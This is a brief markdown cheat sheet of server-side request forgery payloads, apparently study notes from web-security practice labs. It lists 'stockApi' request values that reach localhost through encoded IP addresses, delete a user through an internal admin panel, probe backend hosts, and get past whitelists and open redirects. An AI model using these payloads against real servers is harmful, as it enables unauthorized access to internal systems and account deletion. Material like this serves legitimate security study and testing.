---
title: SSRF Examples
desc: Examples of Server Side Request Forgery.
tags: [SSRF, Web]
alts: []
website:
render_with_liquid: false
---

## Basic localhost

```html
POST /stock HTTP/1.1
...

stockApi=http://localhost/

<!-- IP address -->
stockApi=http://127.0.0.1/
<!-- Alternatives for 127.0.0.1 -->
stockApi=http://2130706433/
stockApi=http://017700000001/
stockApi=http://127.1/

<!-- Operate as administrator -->
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=michael
<!-- Double URL encoding -->
stockApi=http://127.1/%25%36%31dmin
```

<br />

## Backend URL (192.168.0.X)

```html
POST /stock HTTP/1.1
...

stockApi=http://192.168.0.23/admin
stockApi=http://192.168.0.68:8080/admin/delete?username=michael
```

<br />

## Bypass whitelisted URL

```html
POST /stock HTTP/1.1
...

stockApi=http://localhost@vulnerable.com/
<!-- Double URL encoding -->
stockApi=http://localhost%25%32%33@vulnerable.com/
```

<br />

## Open Redirection

```html
POST /stock HTTP/1.1
...

stockApi=/post/next?path=http://localhost/admin
```